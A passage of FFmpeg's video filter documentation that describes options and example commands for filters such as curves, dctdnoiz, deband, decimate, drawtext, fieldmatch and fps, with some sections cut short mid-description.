defined using the following syntax: `x0/y0 x1/y1 x2/y2 ...`.

#### [11.53.1 Commands](#toc-Commands-78)

This filter supports same [commands](#commands) as options.

#### [11.53.2 Examples](#toc-Examples-63)

* Increase slightly the middle level of blue:
  ```
  curves=blue='0/0 0.5/0.58 1/1'

  ```
* Vintage effect:
  ```
  curves=r='0/0.11 .42/.51 1/0.95':g='0/0 0.50/0.48 1/1':b='0/0.22 .49/.44 1/0.8'

  ```

  Here we obtain the following coordinates for each components:

  red

  `(0;0.11) (0.42;0.51) (1;0.95)`

  green

  `(0;0) (0.50;0.48) (1;1)`

  blue

  `(0;0.22) (0.49;0.44) (1;0.80)`
* The previous example can also be achieved with the associated built-in preset:
  ```
  curves=preset=vintage

  ```
* Or simply:
  ```
  curves=vintage

  ```
* Use a Photoshop preset and redefine the points of the green component:
  ```
  curves=psfile='MyCurvesPresets/purple.acv':green='0/0 0.45/0.53 1/1'

  ```
* Check out the curves of the `cross_process` profile using `ffmpeg`
  and `gnuplot`:
  ```
  ffmpeg -f lavfi -i color -vf curves=cross_process:plot=/tmp/curves.plt -frames:v 1 -f null -
  gnuplot -p /tmp/curves.plt

  ```

### [11.54 datascope](#toc-datascope)

This filter shows hexadecimal pixel values of part of video.

The filter accepts the following options:

`size, s`

Set output video size.

`x`

Set x offset from where to pick pixels.

`y`

Set y offset from where to pick pixels.

`mode`

Set scope mode, can be one of the following:

‘`mono`’

Draw hexadecimal pixel values with white color on black background.

‘`color`’

Draw hexadecimal pixel values with input video pixel color on black
background.

‘`color2`’

Draw hexadecimal pixel values on color background picked from input video,
the text color is picked in such way so its always visible.

`axis`

Draw rows and columns numbers on left and top of video.

`opacity`

Set background opacity.

`format`

Set display number format. Can be `hex`, or `dec`. Default is `hex`.

Set pixel components to display. By default all pixel components are displayed.

#### [11.54.1 Commands](#toc-Commands-79)

This filter supports same [commands](#commands) as options excluding `size` option.

### [11.55 dblur](#toc-dblur)

Apply Directional blur filter.

The filter accepts the following options:

`angle`

Set angle of directional blur. Default is `45`.

`radius`

Set radius of directional blur. Default is `5`.

`planes`

Set which planes to filter. By default all planes are filtered.

#### [11.55.1 Commands](#toc-Commands-80)

This filter supports same [commands](#commands) as options.
The command accepts the same syntax of the corresponding option.

If the specified expression is not valid, it is kept at its current
value.

### [11.56 dctdnoiz](#toc-dctdnoiz)

Denoise frames using 2D DCT (frequency domain filtering).

This filter is not designed for real time.

The filter accepts the following options:

`sigma, s`

Set the noise sigma constant.

This sigma defines a hard threshold of `3 * sigma`; every DCT
coefficient (absolute value) below this threshold with be dropped.

If you need a more advanced filtering, see `expr`.

Default is `0`.

`overlap`

Set number overlapping pixels for each block. Since the filter can be slow, you
may want to reduce this value, at the cost of a less effective filter and the
risk of various artefacts.

If the overlapping value doesn’t permit processing the whole input width or
height, a warning will be displayed and according borders won’t be denoised.

Default value is blocksize-1, which is the best possible setting.

`expr, e`

Set the coefficient factor expression.

For each coefficient of a DCT block, this expression will be evaluated as a
multiplier value for the coefficient.

If this is option is set, the `sigma` option will be ignored.

The absolute value of the coefficient can be accessed through the c
variable.

`n`

Set the blocksize using the number of bits. `1<<n` defines the
blocksize, which is the width and height of the processed blocks.

The default value is 3 (8x8) and can be raised to 4 for a
blocksize of 16x16. Note that changing this setting has huge consequences
on the speed processing. Also, a larger block size does not necessarily means a
better de-noising.

#### [11.56.1 Examples](#toc-Examples-64)

Apply a denoise with a `sigma` of `4.5`:

```
dctdnoiz=4.5

```

The same operation can be achieved using the expression system:

```
dctdnoiz=e='gte(c, 4.5*3)'

```

Violent denoise using a block size of `16x16`:

```
dctdnoiz=15:n=4

```

### [11.57 deband](#toc-deband)

Remove banding artifacts from input video.
It works by replacing banded pixels with average value of referenced pixels.

The filter accepts the following options:

`1thr`
`2thr`
`3thr`
`4thr`

Set banding detection threshold for each plane. Default is 0.02.
Valid range is 0.00003 to 0.5.
If difference between current pixel and reference pixel is less than threshold,
it will be considered as banded.

`range, r`

Banding detection range in pixels. Default is 16. If positive, random number
in range 0 to set value will be used. If negative, exact absolute value
will be used.
The range defines square of four pixels around current pixel.

`direction, d`

Set direction in radians from which four pixel will be compared. If positive,
random direction from 0 to set direction will be picked. If negative, exact of
absolute value will be picked. For example direction 0, -PI or -2\*PI radians
will pick only pixels on same row and -PI/2 will pick only pixels on same
column.

`blur, b`

If enabled, current pixel is compared with average value of all four
surrounding pixels. The default is enabled. If disabled current pixel is
compared with all four surrounding pixels. The pixel is considered banded
if only all four differences with surrounding pixels are less than threshold.

`coupling, c`

If enabled, current pixel is changed if and only if all pixel components are banded,
e.g. banding detection threshold is triggered for all color components.
The default is disabled.

#### [11.57.1 Commands](#toc-Commands-81)

This filter supports the all above options as [commands](#commands).

### [11.58 deblock](#toc-deblock)

Remove blocking artifacts from input video.

The filter accepts the following options:

`filter`

Set filter type, can be weak or strong. Default is strong.
This controls what kind of deblocking is applied.

`block`

Set size of block, allowed range is from 4 to 512. Default is 8.

`alpha`
`beta`
`gamma`
`delta`

Set blocking detection thresholds. Allowed range is 0 to 1.
Defaults are: 0.098 for alpha and 0.05 for the rest.
Using higher threshold gives more deblocking strength.
Setting alpha controls threshold detection at exact edge of block.
Remaining options controls threshold detection near the edge. Each one for
below/above or left/right. Setting any of those to 0 disables
deblocking.

`planes`

Set planes to filter. Default is to filter all available planes.

#### [11.58.1 Examples](#toc-Examples-65)

* Deblock using weak filter and block size of 4 pixels.
  ```
  deblock=filter=weak:block=4

  ```
* Deblock using strong filter, block size of 4 pixels and custom thresholds for
  deblocking more edges.
  ```
  deblock=filter=strong:block=4:alpha=0.12:beta=0.07:gamma=0.06:delta=0.05

  ```
* Similar as above, but filter only first plane.
  ```
  deblock=filter=strong:block=4:alpha=0.12:beta=0.07:gamma=0.06:delta=0.05:planes=1

  ```
* Similar as above, but filter only second and third plane.

### [11.59 decimate](#toc-decimate-1)

Drop duplicated frames at regular intervals.

The filter accepts the following options:

`cycle`

Set the number of frames from which one will be dropped. Setting this to
N means one frame in every batch of N frames will be dropped.
Default is `5`.

`dupthresh`

Set the threshold for duplicate detection. If the difference metric for a frame
is less than or equal to this value, then it is declared as duplicate. Default
is `1.1`

`scthresh`

Set scene change threshold. Default is `15`.

`blockx`
`blocky`

Set the size of the x and y-axis blocks used during metric calculations.
Larger blocks give better noise suppression, but also give worse detection of
small movements. Must be a power of two. Default is `32`.

`ppsrc`

Mark main input as a pre-processed input and activate clean source input
stream. This allows the input to be pre-processed with various filters to help
the metrics calculation while keeping the frame selection lossless. When set to
`1`, the first stream is for the pre-processed input, and the second
stream is the clean source from where the kept frames are chosen. Default is
`0`.

`chroma`

Set whether or not chroma is considered in the metric calculations. Default is
`1`.

`mixed`

Set whether or not the input only partially contains content to be decimated.
Default is `false`.
If enabled video output stream will be in variable frame rate.

rainbows for cross-color reduction.

`lt`

Set spatial luma threshold. Lower values increases reduction of cross-luminance.

`tl`

Set tolerance for temporal luma. Higher values increases reduction of cross-luminance.

`tc`

Set tolerance for chroma temporal variation. Higher values increases reduction of cross-color.

`ct`

Set temporal chroma threshold. Lower values increases reduction of cross-color.

### [11.64 dejudder](#toc-dejudder)

Remove judder produced by partially interlaced telecined content.

Judder can be introduced, for instance, by [pullup](#pullup) filter. If the original
source was partially telecined content then the output of `pullup,dejudder`
will have a variable frame rate. May change the recorded frame rate of the
container. Aside from that change, this filter will not affect constant frame
rate video.

The option available in this filter is:

`cycle`

Specify the length of the window over which the judder repeats.

Accepts any integer greater than 1. Useful values are:

‘`4`’

If the original was telecined from 24 to 30 fps (Film to NTSC).

‘`5`’

If the original was telecined from 25 to 30 fps (PAL to NTSC).

‘`20`’

If a mixture of the two.

The default is ‘`4`’.

### [11.65 delogo](#toc-delogo)

Suppress a TV station logo by a simple interpolation of the surrounding

`x`
`y`

Specify the top left corner coordinates of the logo. They must be
specified.

`w`
`h`

Specify the width and height of the logo to clear. They must be

The rectangle is drawn on the outermost pixels which will be (partly)
replaced with interpolated values. The values of the next pixels
immediately outside this rectangle in each direction will be used to
compute the interpolated pixel values inside the rectangle.

#### [11.65.1 Examples](#toc-Examples-66)

not sure about the box source.

`t`

The thickness of the drawn box.

These constants allow the x, y, w, h and t expressions to refer to
each other, so you may for example specify `y=x/dar` or `h=w/dar`.

Set the height of the box to be drawn around text.
The default value of boxh is computed automatically to match the text height

`shadowx`
`shadowy`

The x and y offsets for the text shadow position with respect to the
position of the text. They can be either positive or negative
values. The default value for both is "0".

`start_number`

The starting frame number for the n/frame\_num variable. The default value
is "0".

`tabsize`

The size in number of spaces to use for rendering the tab.
Default value is 4.

encoded characters.
This parameter is mandatory if no file is specified with the parameter
textfile.

`textfile`

A text file containing text to be drawn. The text must be a sequence
of UTF-8 encoded characters.

This parameter is mandatory if no text string is specified with the
parameter text.

If both text and textfile are specified, an error is thrown.

`text_source`

Text source should be set as side\_data\_detection\_bboxes if you want to use text data in
detection bboxes of side data.

If text source is set, text and textfile will be ignored and still use
text data in detection bboxes of side data. So please do not use this parameter
if you are not sure about the text source.

`reload`

The textfile will be reloaded at specified frame interval.
Be sure to update textfile atomically, or it may be read partially,
or even fail.
Range is 0 to INT\_MAX. Default is 0.

`x`
`y`

The expressions which specify the offsets where text will be drawn
within the video frame. They are relative to the top/left border of the
output image.

The default value of x and y is "0".

See below for the list of accepted constants and functions.

The parameters for x and y are expressions containing the
following constants and functions:

`dar`

input display aspect ratio, it is the same as (w / h) \* sar

`hsub`
`vsub`

horizontal and vertical chroma subsample values. For example for the
pixel format "yuv422p" hsub is 2 and vsub is 1.

`line_h, lh`

the height of each text line

`main_h, h, H`

the input height

`main_w, w, W`

the input width

`max_glyph_a, ascent`

the maximum distance from the baseline to the highest/upper grid
coordinate used to place a glyph outline point, for all the rendered
glyphs.
It is a positive value, due to the grid’s orientation with the Y axis
upwards.

`max_glyph_d, descent`

the maximum distance from the baseline to the lowest grid coordinate
used to place a glyph outline point, for all the rendered glyphs.
This is a negative value, due to the grid’s orientation, with the Y axis
upwards.

`max_glyph_h`

maximum glyph height, that is the maximum height for all the glyphs
contained in the rendered text, it is equivalent to ascent -
descent.

`max_glyph_w`

maximum glyph width, that is the maximum width for all the glyphs
contained in the rendered text

`font_a`

the ascent size defined in the font metrics

`font_d`

the descent size defined in the font metrics

`top_a`

the maximum ascender of the glyphs of the first text line

`bottom_d`

the maximum descender of the glyphs of the last text line

`n`

the number of input frame, starting from 0

`rand(min, max)`

return a random number included between min and max

`sar`

The input sample aspect ratio.

`t`

timestamp expressed in seconds, NAN if the input timestamp is unknown

`text_h, th`

the height of the rendered text

`text_w, tw`

the width of the rendered text

`x`
`y`

the x and y offset coordinates where the text is drawn.

These parameters allow the x and y expressions to refer
to each other, so you can for example specify `y=x/dar`.

`pict_type`

A one character description of the current frame’s picture type.

`pkt_pos`

The current packet’s position in the input file or stream
(in bytes, from the start of the input). A value of -1 indicates
this info is not available.

`duration`

The current packet’s duration, in seconds.

`pkt_size`

The current packet’s size (in bytes).

#### [11.78.2 Text expansion](#toc-Text-expansion)

If `expansion` is set to `strftime`, the filter recognizes
sequences accepted by the `strftime` C function in the provided
text and expands them accordingly. Check the documentation of
`strftime`. This feature is deprecated in favor of `normal`
expansion with the `gmtime` or `localtime` expansion
functions.

If `expansion` is set to `none`, the text is printed verbatim.

If `expansion` is set to `normal` (which is the default),
the following expansion mechanism is used.

The backslash character ‘`\`’, followed by any character, always expands to
the second character.

Sequences of the form `%{...}` are expanded. The text between the
braces is a function name, possibly followed by arguments separated by ’:’.
If the arguments contain special characters or delimiters (’:’ or ’}’),
they should be escaped.

Note that they probably must also be escaped as the value for the `text`
option in the filter argument string and as the filter argument in the
filtergraph description, and possibly also for the shell, that makes up to four
levels of escaping; using a text file with the `textfile` option avoids
these problems.

The following functions are available:

`expr, e`

The expression evaluation result.

It must take one argument specifying the expression to be evaluated,
which accepts the same constants and functions as the x and
y values. Note that not all constants should be used, for
example the text size is not known when evaluating the expression, so
the constants text\_w and text\_h will have an undefined
value.

`expr_int_format, eif`

Evaluate the expression’s value and output as formatted integer.

The first argument is the expression to be evaluated, just as for the expr function.
The second argument specifies the output format. Allowed values are ‘`x`’,
‘`X`’, ‘`d`’ and ‘`u`’. They are treated exactly as in the
`printf` function.
The third parameter is optional and sets the number of positions taken by the output.
It can be used to add padding with zeros from the left.

`gmtime`

The time at which the filter is running, expressed in UTC.
It can accept an argument: a `strftime` C function format string.
The format string is extended to support the variable %[1-6]N
which prints fractions of the second with optionally specified number of digits.

`localtime`

The time at which the filter is running, expressed in the local time zone.
It can accept an argument: a `strftime` C function format string.
The format string is extended to support the variable %[1-6]N
which prints fractions of the second with optionally specified number of digits.

`metadata`

Frame metadata. Takes one or two arguments.

The first argument is mandatory and specifies the metadata key.

The second argument is optional and specifies a default value, used when the
metadata key is not found or empty.

Available metadata can be identified by inspecting entries
starting with TAG included within each frame section
printed by running `ffprobe -show_frames`.

String metadata generated in filters leading to
the drawtext filter are also available.

`n, frame_num`

The frame number, starting from 0.

`pict_type`

A one character description of the current picture type.

`pts`

The timestamp of the current frame.
It can take up to three arguments.

The first argument is the format of the timestamp; it defaults to `flt`
for seconds as a decimal number with microsecond accuracy; `hms` stands
for a formatted [-]HH:MM:SS.mmm timestamp with millisecond accuracy.
`gmtime` stands for the timestamp of the frame formatted as UTC time;
`localtime` stands for the timestamp of the frame formatted as
local time zone time.

The second argument is an offset added to the timestamp.

If the format is set to `hms`, a third argument `24HH` may be
supplied to present the hour part of the formatted timestamp in 24h format
(00-23).

If the format is set to `localtime` or `gmtime`, a third
argument may be supplied: a `strftime` C function format string.
By default, YYYY-MM-DD HH:MM:SS format will be used.

#### [11.78.3 Commands](#toc-Commands-88)

This filter supports altering parameters via commands:

`reinit`

Alter existing filter parameters.

Syntax for the argument is the same as for filter invocation, e.g.

```
fontsize=56:fontcolor=green:text='Hello World'

```

Full filter invocation with sendcmd would look like this:

```
sendcmd=c='56.0 drawtext reinit fontsize=56\:fontcolor=green\:text=Hello\\ World'

```

If the entire argument can’t be parsed or applied as valid values then the filter will
continue with its existing parameters.

The following options are also supported as [commands](#commands):

* x
* y
* alpha
* fontsize
* fontcolor
* boxcolor
* bordercolor
* shadowcolor
* box
* boxw
* boxh
* boxborderw
* line\_spacing
* text\_align
* shadowx
* shadowy
* borderw

Detect and draw edges. The filter uses the Canny Edge Detection algorithm.

The filter accepts the following options:

`low`
`high`

Set low and high threshold values used by the Canny thresholding
algorithm.

The high threshold selects the "strong" edge pixels, which are then
connected through 8-connectivity with the "weak" edge pixels selected
by the low threshold.

low and high threshold values must be chosen in the range
[0,1], and low should be lesser or equal to high.

Default value for low is `20/255`, and default value for high
is `50/255`.

`mode`

Define the drawing mode.

‘`wires`’

Draw white/gray wires on black background.

‘`colormix`’

After filter receives frame from 2nd input, that frame
is combined on top of original frame from 1st input and passed
to 1st output.

The typical usage is filter only part of frame.

The filter accepts the following options:

`x`
`y`

Set the top left crop position.

`w`
`h`

Set the crop size.

#### [11.89.1 Examples](#toc-Examples-75)

  ```
  [in][blurin]feedback=x=0:y=0:w=100:h=100[out][blurout];[blurout]gblur=8[blurin]

  ```
* Draw black box on top left part of video frame of size 100x100 with drawbox filter.
  ```

### [11.92 field](#toc-field)

Extract a single field from an interlaced image using stride
arithmetic to avoid wasting CPU time. The output frames are marked as
non-interlaced.

The filter accepts the following options:

`type`

Specify whether to extract the top (if the value is `0` or
`top`) or the bottom field (if the value is `1` or
`bottom`).

### [11.93 fieldhint](#toc-fieldhint)

Create new frames by copying the top and bottom fields from surrounding frames
supplied as numbers by the hint file.

`hint`

Set file containing hints: absolute/relative frame numbers.

There must be one line for each frame in a clip. Each line must contain two
numbers separated by the comma, optionally followed by `-` or `+`.
Numbers supplied on each line of file can not be out of [N-1,N+1] where N
is current frame number for `absolute` mode or out of [-1, 1] range
for `relative` mode. First number tells from which frame to pick up top
field and second number tells from which frame to pick up bottom field.

If optionally followed by `+` output frame will be marked as interlaced,
else if followed by `-` output frame will be marked as progressive, else
it will be marked same as input frame.
If optionally followed by `t` output frame will use only top field, or in
case of `b` it will use only bottom field.
If line starts with `#` or `;` that line is skipped.

`mode`

Can be item `absolute` or `relative` or `pattern`. Default is `absolute`.
The `pattern` mode is same as `relative` mode, except at last entry of file if there
are more frames to process than `hint` file is seek back to start.

Example of first several lines of `hint` file for `relative` mode:

```
0,0 - # first frame
1,0 - # second frame, use third's frame top field and second's frame bottom field
1,0 - # third frame, use fourth's frame top field and third's frame bottom field
1,0 -
0,0 -
0,0 -
1,0 -
1,0 -
1,0 -
0,0 -
0,0 -
1,0 -
1,0 -
1,0 -
0,0 -

```

### [11.94 fieldmatch](#toc-fieldmatch)

Field matching filter for inverse telecine. It is meant to reconstruct the
progressive frames from a telecined stream. The filter does not drop duplicated
frames, so to achieve a complete inverse telecine `fieldmatch` needs to be
followed by a decimation filter such as [decimate](#decimate) in the filtergraph.

The separation of the field matching and the decimation is notably motivated by
the possibility of inserting a de-interlacing filter fallback between the two.
If the source has mixed telecined and real interlaced content,
`fieldmatch` will not be able to match fields for the interlaced parts.
But these remaining combed frames will be marked as interlaced, and thus can be
de-interlaced by a later filter such as [yadif](#yadif) before decimation.

In addition to the various configuration options, `fieldmatch` can take an
optional second stream, activated through the `ppsrc` option. If
enabled, the frames reconstruction will be based on the fields and frames from
this second stream. This allows the first input to be pre-processed in order to
help the various algorithms of the filter, while keeping the output lossless
(assuming the fields are matched properly). Typically, a field-aware denoiser,
or brightness/contrast adjustments can help.

Note that this filter uses the same algorithms as TIVTC/TFM (AviSynth project)
and VIVTC/VFM (VapourSynth project). The later is a light clone of TFM from
which `fieldmatch` is based on. While the semantic and usage are very
close, some behaviour and options names can differ.

The [decimate](#decimate) filter currently only works for constant frame rate input.
If your input has mixed telecined (30fps) and progressive content with a lower
framerate like 24fps use the following filterchain to produce the necessary cfr
stream: `dejudder,fps=30000/1001,fieldmatch,decimate`.

The filter accepts the following options:

`order`

Specify the assumed field order of the input stream. Available values are:

‘`auto`’

Auto detect parity (use FFmpeg’s internal parity value).

‘`bff`’

Assume bottom field first.

‘`tff`’

Assume top field first.

Note that it is sometimes recommended not to trust the parity announced by the
stream.

Default value is auto.

`mode`

Set the matching mode or strategy to use. `pc` mode is the safest in the
sense that it won’t risk creating jerkiness due to duplicate frames when
possible, but if there are bad edits or blended fields it will end up
outputting combed frames when a good match might actually exist. On the other
hand, `pcn_ub` mode is the most risky in terms of creating jerkiness,
but will almost always find a good frame if there is one. The other values are
all somewhere in between `pc` and `pcn_ub` in terms of risking
jerkiness and creating duplicate frames versus finding good matches in sections
with bad edits, orphaned fields, blended fields, etc.

More details about p/c/n/u/b are available in [p/c/n/u/b meaning](#p_002fc_002fn_002fu_002fb-meaning) section.

Available values are:

‘`pc`’

2-way matching (p/c)

‘`pc_n`’

2-way matching, and trying 3rd match if still combed (p/c + n)

‘`pc_u`’

2-way matching, and trying 3rd match (same order) if still combed (p/c + u)

‘`pc_n_ub`’

2-way matching, trying 3rd match if still combed, and trying 4th/5th matches if
still combed (p/c + n + u/b)

‘`pcn`’

3-way matching (p/c/n)

‘`pcn_ub`’

3-way matching, and trying 4th/5th matches if all 3 of the original matches are
detected as combed (p/c/n + u/b)

The parenthesis at the end indicate the matches that would be used for that
mode assuming `order`=tff (and `field` on auto or
top).

In terms of speed `pc` mode is by far the fastest and `pcn_ub` is
the slowest.

Default value is pc\_n.

`ppsrc`

Mark the main input stream as a pre-processed input, and enable the secondary
input stream as the clean source to pick the fields from. See the filter
introduction for more details. It is similar to the `clip2` feature from
VFM/TFM.

Default value is `0` (disabled).

`field`

Set the field to match from. It is recommended to set this to the same value as
`order` unless you experience matching failures with that setting. In
certain circumstances changing the field that is used to match from can have a
large impact on matching performance. Available values are:

‘`auto`’

Automatic (same value as `order`).

‘`bottom`’

Match from the bottom field.

‘`top`’

Match from the top field.

Default value is auto.

`mchroma`

Set whether or not chroma is included during the match comparisons. In most
cases it is recommended to leave this enabled. You should set this to `0`
only if your clip has bad chroma problems such as heavy rainbowing or other
artifacts. Setting this to `0` could also be used to speed things up at
the cost of some accuracy.

Default value is `1`.

`y0`
`y1`

These define an exclusion band which excludes the lines between `y0` and
`y1` from being included in the field matching decision. An exclusion
band can be used to ignore subtitles, a logo, or other things that may
interfere with the matching. `y0` sets the starting scan line and
`y1` sets the ending line; all lines in between `y0` and
`y1` (including `y0` and `y1`) will be ignored. Setting
`y0` and `y1` to the same value will disable the feature.
`y0` and `y1` defaults to `0`.

`scthresh`

Set the scene change detection threshold as a percentage of maximum change on
the luma plane. Good values are in the `[8.0, 14.0]` range. Scene change
detection is only relevant in case `combmatch`=sc. The range for
`scthresh` is `[0.0, 100.0]`.

Default value is `12.0`.

`combmatch`

When `combatch` is not none, `fieldmatch` will take into
account the combed scores of matches when deciding what match to use as the
final match. Available values are:

‘`none`’

No final matching based on combed scores.

‘`sc`’

Combed scores are only used when a scene change is detected.

‘`full`’

Use combed scores all the time.

Default is sc.

`combdbg`

Force `fieldmatch` to calculate the combed metrics for certain matches and
print them. This setting is known as `micout` in TFM/VFM vocabulary.
Available values are:

‘`none`’

No forced calculation.

‘`pcn`’

Force p/c/n calculations.

‘`pcnub`’

Force p/c/n/u/b calculations.

Default value is none.

`cthresh`

This is the area combing threshold used for combed frame detection. This
essentially controls how "strong" or "visible" combing must be to be detected.
Larger values mean combing must be more visible and smaller values mean combing
can be less visible or strong and still be detected. Valid settings are from
`-1` (every pixel will be detected as combed) to `255` (no pixel will
be detected as combed). This is basically a pixel difference value. A good
range is `[8, 12]`.

Default value is `9`.

`chroma`

Sets whether or not chroma is considered in the combed frame decision. Only
disable this if your source has chroma problems (rainbowing, etc.) that are
causing problems for the combed frame detection with chroma enabled. Actually,
using `chroma`=0 is usually more reliable, except for the case
where there is chroma only combing in the source.

Default value is `0`.

`blockx`
`blocky`

Respectively set the x-axis and y-axis size of the window used during combed
frame detection. This has to do with the size of the area in which
`combpel` pixels are required to be detected as combed for a frame to be
declared combed. See the `combpel` parameter description for more info.
Possible values are any number that is a power of 2 starting at 4 and going up
to 512.

Default value is `16`.

`combpel`

The number of combed pixels inside any of the `blocky` by
`blockx` size blocks on the frame for the frame to be detected as
combed. While `cthresh` controls how "visible" the combing must be, this
setting controls "how much" combing there must be in any localized area (a
window defined by the `blockx` and `blocky` settings) on the
frame. Minimum value is `0` and maximum is `blocky x blockx` (at
which point no frames will ever be detected as combed). This setting is known
as `MI` in TFM/VFM vocabulary.

Default value is `80`.

#### [11.94.1 p/c/n/u/b meaning](#toc-p_002fc_002fn_002fu_002fb-meaning-1)

#### [11.94.1.1 p/c/n](#toc-p_002fc_002fn)

We assume the following telecined stream:

```
Top fields:     1 2 2 3 4
Bottom fields:  1 2 3 4 4

```

The numbers correspond to the progressive frame the fields relate to. Here, the
first two frames are progressive, the 3rd and 4th are combed, and so on.

When `fieldmatch` is configured to run a matching from bottom
(`field`=bottom) this is how this input stream get transformed:

```
Input stream:
                T     1 2 2 3 4
                B     1 2 3 4 4   <-- matching reference

Matches:              c c n n c

Output stream:
                T     1 2 3 4 4
                B     1 2 3 4 4

```

As a result of the field matching, we can see that some frames get duplicated.
To perform a complete inverse telecine, you need to rely on a decimation filter
after this operation. See for instance the [decimate](#decimate) filter.

The same operation now matching from top fields (`field`=top)
looks like this:

```
Input stream:
                T     1 2 2 3 4   <-- matching reference
                B     1 2 3 4 4

Matches:              c c p p c

Output stream:
                T     1 2 2 3 4
                B     1 2 2 3 4

```

In these examples, we can see what p, c and n mean;
basically, they refer to the frame and field of the opposite parity:

* p matches the field of the opposite parity in the previous frame
* c matches the field of the opposite parity in the current frame
* n matches the field of the opposite parity in the next frame

#### [11.94.1.2 u/b](#toc-u_002fb)

The u and b matching are a bit special in the sense that they match
from the opposite parity flag. In the following examples, we assume that we are
currently matching the 2nd frame (Top:2, bottom:2). According to the match, a
’x’ is placed above and below each matched fields.

With bottom matching (`field`=bottom):

```
Match:           c         p           n          b          u

                 x       x               x        x          x
  Top          1 2 2     1 2 2       1 2 2      1 2 2      1 2 2
  Bottom       1 2 3     1 2 3       1 2 3      1 2 3      1 2 3
                 x         x           x        x              x

Output frames:
                 2          1          2          2          2
                 2          2          2          1          3

```

With top matching (`field`=top):

```
Match:           c         p           n          b          u

                 x         x           x        x              x
  Top          1 2 2     1 2 2       1 2 2      1 2 2      1 2 2
  Bottom       1 2 3     1 2 3       1 2 3      1 2 3      1 2 3
                 x       x               x        x          x

Output frames:
                 2          2          2          1          2
                 2          1          3          2          2

```

#### [11.94.2 Examples](#toc-Examples-77)

Simple IVTC of a top field first telecined stream:

```
fieldmatch=order=tff:combmatch=none, decimate

```

Advanced IVTC, with fallback on [yadif](#yadif) for still combed frames:

```
fieldmatch=order=tff:combmatch=full, yadif=deint=interlaced, decimate

```

### [11.95 fieldorder](#toc-fieldorder)

Transform the field order of the input video.

It accepts the following parameters:

`order`

The output field order. Valid values are tff for top field first or bff
for bottom field first.

The default value is ‘`tff`’.

The transformation is done by shifting the picture content up or down
by one line, and filling the remaining line with appropriate picture content.
This method is consistent with most broadcast field order converters.

If the input video is not flagged as being interlaced, or it is already
flagged as being of the required output field order, then this filter does
not alter the incoming video.

It is very useful when converting to or from PAL DV material,
which is bottom field first.

For example:

```
ffmpeg -i in.vob -vf "fieldorder=bff" out.dv

```

### [11.96 fillborders](#toc-fillborders)

Sometimes video can have garbage at the four edges and you may not want to
crop video input to keep size multiple of some number.

This filter accepts the following options:

`left`

Number of pixels to fill from left border.

`right`

Number of pixels to fill from right border.

`top`

Number of pixels to fill from top border.

`bottom`

#### [11.96.1 Commands](#toc-Commands-93)

This filter supports same [commands](#commands) as options.
The command accepts the same syntax of the corresponding option.

If the specified expression is not valid, it is kept at its current
value.

### [11.97 find\_rect](#toc-find_005frect)

Find a rectangular object in the input video.

The object to search for must be specified as a gray8 image specified with the
`object` option.

For each possible match, a score is computed. If the score reaches the specified
threshold, the object is considered found.

If the input video contains multiple instances of the object, the filter will
find only one of them.

When an object is found, the following metadata entries are set in the matching
frame:

`lavfi.rect.w`

width of object

`lavfi.rect.h`

height of object

`lavfi.rect.x`

x position of object

`lavfi.rect.y`

y position of object

`lavfi.rect.score`

match score of the found object

It accepts the following options:

`object`

Filepath of the object image, needs to be in gray8.

`threshold`

Detection threshold, expressed as a decimal number in the range 0-1.

A threshold value of 0.01 means only exact matches, a threshold of 0.99 means
almost everything matches.

Default value is 0.5.

`mipmaps`

Number of mipmaps, default is 3.

`xmin, ymin, xmax, ymax`

Specifies the rectangle in which to search.

`discard`

Discard frames where object is not detected. Default is disabled.

#### [11.97.1 Examples](#toc-Examples-78)

* Cover a rectangular object by the supplied image of a given video using `ffmpeg`:
  ```
  ffmpeg -i file.ts -vf find_rect=newref.pgm,cover_rect=cover.jpg:mode=cover new.mkv

  ```
* Find the position of an object in each frame using `ffprobe` and write
  it to a log file:
  ```
  ffprobe -f lavfi movie=test.mp4,find_rect=object=object.pgm:threshold=0.3 \
    -show_entries frame=pkt_pts_time:frame_tags=lavfi.rect.x,lavfi.rect.y \
    -of csv -o find_rect.csv

  ```

Libavfilter will try to pick one that is suitable as input to
the next filter.

It accepts the following parameters:

`pix_fmts`

A ’|’-separated list of pixel format names, such as
"pix\_fmts=yuv420p|monow|rgb24".

`color_spaces`

A ’|’-separated list of color space names, such as
"color\_spaces=bt709|bt470bg|bt2020nc".

`color_ranges`

A ’|’-separated list of color range names, such as
"color\_spaces=tv|pc".

#### [11.99.1 Examples](#toc-Examples-79)

* Convert the input video to the yuv420p format
  ```
  format=pix_fmts=yuv420p

  ```

  Convert the input video to any of the formats in the list

  ```
  format=pix_fmts=yuv420p|yuv444p|yuv410p

  ```

### [11.100 fps](#toc-fps-1)

Convert the video to specified constant frame rate by duplicating or dropping
frames as necessary.

It accepts the following parameters:

`fps`

The desired output frame rate. It accepts expressions containing the following
constants:

‘`source_fps`’

The input’s frame rate

‘`ntsc`’

NTSC frame rate of `30000/1001`

‘`pal`’

PAL frame rate of `25.0`

‘`film`’

Film frame rate of `24.0`

‘`ntsc_film`’

NTSC-film frame rate of `24000/1001`

The default is `25`.

`start_time`

Assume the first PTS should be the given value, in seconds. This allows for
padding/trimming at the start of stream. By default, no assumption is made
about the first frame’s expected PTS, so no padding or trimming is done.
For example, this could be set to 0 to pad the beginning with duplicates of
the first frame if a video stream starts after the audio stream or to trim any
frames with a negative PTS.

`round`

Timestamp (PTS) rounding method.

Possible values are:

`zero`

round towards 0

`inf`

round away from 0

`down`

round towards -infinity

`up`

round towards +infinity

`near`

round to nearest

The default is `near`.

`eof_action`

Action performed when reading the last frame.

Possible values are:

`round`

Use same timestamp rounding method as used for other frames.

`pass`

Pass through last frame if input duration has not been reached yet.

The default is `round`.

Alternatively, the options can be specified as a flat string:
fps[:start\_time[:round]].

See also the [setpts](#setpts) filter.

#### [11.100.1 Examples](#toc-Examples-80)

* A typical usage in order to set the fps to 25:
  ```
  fps=fps=25

  ```
* Sets the fps to 24, using abbreviation and rounding method to round to nearest:
  ```
  fps=fps=film:round=near

  ```

### [11.101 framepack](#toc-framepack)

Pack two different video streams into a stereoscopic video, setting proper
metadata on supported codecs. The two views should have the same size and
framerate and processing will stop when the shorter video ends. Please note
that you may conveniently adjust view properties with the [scale](#scale) and
[fps](#fps) filters.

It accepts the following parameters:

`format`

The desired packing format. Supported values are:

`sbs`

The views are next to each other (default).

`tab`

The views are on top of each other.

`lines`

The views are packed by line.

`columns`

The views are packed by column.

`frameseq`

The views are temporally interleaved.

Some examples:

```
# Convert left and right views into a frame-sequential video
ffmpeg -i LEFT -i RIGHT -filter_complex framepack=frameseq OUTPUT

# Convert views into a side-by-side video with the same output resolution as the input
